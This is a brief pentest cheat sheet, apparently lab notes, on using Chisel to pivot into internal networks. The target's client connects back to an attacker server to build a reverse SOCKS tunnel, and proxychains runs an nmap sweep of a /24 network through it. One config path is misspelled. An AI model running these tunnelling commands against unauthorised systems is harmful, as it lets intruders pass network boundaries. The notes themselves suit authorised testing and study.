#Chisel Linux Usage
./chisel server -p 8001 --reverse   (in attacker machine)
edit /etc/proxychains.conf  or edit /etc/proxychains4.conf
(it depends which file u will use)
socks5 127.0.0.1 1080
./chisel_linux_386 client 192.168.45.224:8001 R:1080:socks 
proxychains -f /etc/proxhchains.conf nmap 10.2.1.1/24

#Chisel Windows Usage
./chisel server -p 8002 --reverse   (in attacker machine)
edit /etc/proxychains.conf  
socks5 127.0.0.1 2080
chisel.exe client 10.2.1.101:8002 R:2080:socks
